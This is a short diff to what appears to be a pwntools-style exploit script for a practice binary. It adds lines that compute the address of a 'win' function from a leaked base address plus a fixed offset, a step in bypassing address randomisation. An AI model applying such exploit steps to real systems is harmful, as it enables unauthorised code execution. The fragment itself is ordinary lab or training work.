@@ -22,5 +22,10 @@ if __name__ == "__main__":
     # This is also not useful, so it is dropped as well.
     debug_useless_info = process_to_exploit.recvlines(2)
 
+    # The offset from the base address to "win" is +5130 (decimal).
+    # I convert the hex address to decimal and add the offset.
+    base_address_as_dec = int(base_address_as_hex, 16)
+    win_address_as_dec = base_address_as_dec + 5130
+
 
     print("I am a breakpoint placeholder to help with debugging")
